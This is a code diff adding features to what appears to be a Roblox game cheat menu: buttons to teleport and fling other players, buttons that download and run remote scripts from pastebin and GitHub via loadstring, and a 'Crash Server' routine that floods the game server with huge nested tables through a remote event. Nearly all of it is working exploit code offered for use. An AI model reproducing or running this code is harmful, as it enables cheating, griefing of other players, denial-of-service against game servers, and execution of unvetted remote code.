@@ -353,6 +353,58 @@ Tab3Section:NewButton("Aimbot", "load it", function()
 }
 end)
 
+Tab3Section:NewTextBox("Bring Player", "Freeze Players", function(name)
+Target = name
+
+NOW = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+game.Players.LocalPlayer.Character.Humanoid.Name = 1
+local l = game.Players.LocalPlayer.Character["1"]:Clone()
+l.Parent = game.Players.LocalPlayer.Character
+l.Name = "Humanoid"
+wait()
+game.Players.LocalPlayer.Character["1"]:Destroy()
+game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+wait()
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
+for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
+game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
+end
+local function tp(player,player2)
+local char1,char2=player.Character,player2.Character
+if char1 and char2 then
+char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
+end
+end
+local function getout(player,player2)
+local char1,char2=player.Character,player2.Character
+if char1 and char2 then
+char1:MoveTo(char2.Head.Position)
+end
+end
+tp(game.Players[Target], game.Players.LocalPlayer)
+wait()
+tp(game.Players[Target], game.Players.LocalPlayer)
+wait()
+getout(game.Players.LocalPlayer, game.Players[Target])
+wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
+end)
+
+Tab3Section:NewTextBox("Teleport Player", "wth", function(value)
+local Target = value
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Target].LocalPlayer.Character.HumanoidRootPart.CFrame
+end) 
+
+Tab3Section:NewButton("Give Tools", "Give Someone your tools", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/k778UByk"))()
+end)
+
+Tab3Section:NewButton("Giant Legs", "So big legs", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg Resize'))()
+end)
+
 Tab3Section:NewButton("Grab Gun(only innocent)", "grab guns",function()
     local lastCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
     wait(0.3)
@@ -366,6 +418,59 @@ Tab3Section:NewButton("Grab Gun(only innocent)", "grab guns",function()
     end
     end
  end)
+
+Tab3Section:NewButton("Crash Server", "Bomb server", function()
+local char = game:GetService('Players').LocalPlayer.Character or nil
+if char then
+char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+task.wait(0.5)
+char.HumanoidRootPart.Anchored = true
+end
+while wait(1.5) do --// don't change it's the best
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function getmaxvalue(val)
+   local mainvalueifonetable = 499999
+   if type(val) ~= "number" then
+       return nil
+   end
+   local calculateperfectval = (mainvalueifonetable/(val+2))
+   return calculateperfectval
+end
+ 
+local function bomb(tableincrease, tries)
+local maintable = {}
+local spammedtable = {}
+ 
+table.insert(spammedtable, {})
+z = spammedtable[1]
+ 
+for i = 1, tableincrease do
+    local tableins = {}
+    table.insert(z, tableins)
+    z = tableins
+end
+ 
+local calculatemax = getmaxvalue(tableincrease)
+local maximum
+ 
+if calculatemax then
+     maximum = calculatemax
+     else
+     maximum = 999999
+end
+ 
+for i = 1, maximum do
+     table.insert(maintable, spammedtable)
+end
+ 
+for i = 1, tries do
+     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+end
+end
+ 
+bomb(199, 7)
+end
+end)
 
 Tab3Section:NewTextBox("Hitbox(only murder)"," Hit your damage", function(value)
     print("Executed")
